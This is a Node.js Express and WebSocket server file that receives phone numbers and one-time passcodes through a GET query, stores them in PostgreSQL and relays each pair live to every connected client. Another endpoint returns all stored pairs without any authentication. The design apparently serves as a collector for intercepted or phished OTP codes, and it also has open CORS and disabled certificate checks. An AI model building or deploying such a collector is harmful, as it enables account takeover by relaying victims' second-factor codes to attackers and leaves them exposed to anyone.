const express = require('express');
const { Pool } = require('pg');
const path = require('path');
const cors = require('cors');
const { WebSocketServer } = require('ws'); // Import WebSocket library

const app = express();

// Enable CORS
app.use(cors());

// Connect to PostgreSQL
const pool = new Pool({
    connectionString: process.env.DATABASE_URL,
    ssl: { rejectUnauthorized: false },
});

// Store WebSocket clients
const clients = [];

// WebSocket server setup
const wss = new WebSocketServer({ noServer: true });
wss.on('connection', (ws) => {
    console.log('New WebSocket connection');
    clients.push(ws);

    // Handle WebSocket disconnection
    ws.on('close', () => {
        console.log('WebSocket connection closed');
        const index = clients.indexOf(ws);
        if (index > -1) {
            clients.splice(index, 1);
        }
    });

    // Handle WebSocket errors
    ws.on('error', (error) => {
        console.error('WebSocket error:', error);
    });

    // Send welcome message
    ws.send(JSON.stringify({ message: 'Welcome to the WebSocket server' }));
});

// Serve static HTML from 'public' folder
app.use(express.static(path.join(__dirname, 'public')));

// Endpoint to receive phone and OTP
app.get('/', async (req, res) => {
    const phone = req.query.phone;
    const otp = req.query.otp;

    if (!phone || !otp) {
        return res.status(400).json({
            message: 'Phone number and OTP are required',
            status: 'error',
        });
    }

    try {
        // Save OTP to the database
        await pool.query('INSERT INTO otps (phone, otp) VALUES ($1, $2)', [phone, otp]);

        // Notify all connected WebSocket clients
        const message = JSON.stringify({ phone, otp });
        clients.forEach((ws) => ws.send(message));

        res.status(200).json({
            message: `OTP ${otp} received for phone ${phone}`,
            status: 'success',
        });
    } catch (error) {
        console.error('Error saving OTP:', error);
        res.status(500).json({
            message: 'Error saving OTP',
            status: 'error',
        });
    }
});

// Fetch all OTP data from the database
app.get('/fetch-otp-data', async (req, res) => {
    try {
        const result = await pool.query('SELECT phone, otp, created_at FROM otps ORDER BY id DESC');
        res.json(result.rows);
    } catch (error) {
        console.error('Error fetching OTP data:', error);
        res.status(500).json({
            message: 'Error fetching OTP data',
            status: 'error',
        });
    }
});

// Start the server and attach WebSocket
const server = app.listen(process.env.PORT || 3000, () => {
    console.log(`Server running on port ${process.env.PORT || 3000}`);
});

// Upgrade HTTP connections to WebSocket
server.on('upgrade', (req, socket, head) => {
    wss.handleUpgrade(req, socket, head, (ws) => {
        wss.emit('connection', ws, req);
    });
});
